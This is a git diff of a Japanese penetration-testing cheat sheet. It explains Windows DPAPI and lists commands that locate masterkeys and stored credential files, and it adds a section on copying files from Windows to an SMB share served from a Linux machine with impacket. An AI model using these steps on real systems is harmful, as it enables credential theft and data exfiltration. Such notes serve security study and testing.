@@ -116,7 +116,7 @@ mdb-sql -d '|' -P <ファイル> # SQLクエリで見やすくパイプ区切り
 Outlookで送受信したメールや、連絡先などのデータをローカルで保存するためのファイル形式。  
 `readpst <ファイル>`
 
-## DPAPI
+## DPAPIについて
 Data Protection APIの略で、パスワード、クッキー、証明書などを暗号化して保存するためのAPI。  
 `/savecred`などの資格情報もDPAPIによって暗号化されてディスクに保存されている。  
 DPAPIで暗号化されたファイルを復号するにはMasterkeyが必要で、`dir /S /AS`を使って探すことができる。  
@@ -128,4 +128,13 @@ dir /S /AS C:\Users\<ユーザー>\AppData\Local\Microsoft\Protect # 端末固�
 dir /S /AS C:\Users\<ユーザー>\AppData\Roaming\Microsoft\Vault # あまり使われない
 dir /S /AS C:\Users\<ユーザー>\AppData\Roaming\Microsoft\Credentials # ドメインネットワーク内の共有フォルダのアクセス権や/savecredなどのデータ
 dir /S /AS C:\Users\<ユーザー>\AppData\Roaming\Microsoft\Protect # ユーザーごとのデータのmasterkey
+```
+
+## Linuxへのファイルコピー
+```bash
+# linuxで実行
+impacket-smbserver <共有名> $(pwd) -smb2support
+# windowsで実行
+net use X: \\<Linux IP>\<共有名>
+copy/xcopy/robocopy <送信ファイル> X:\<保存名>
 ```
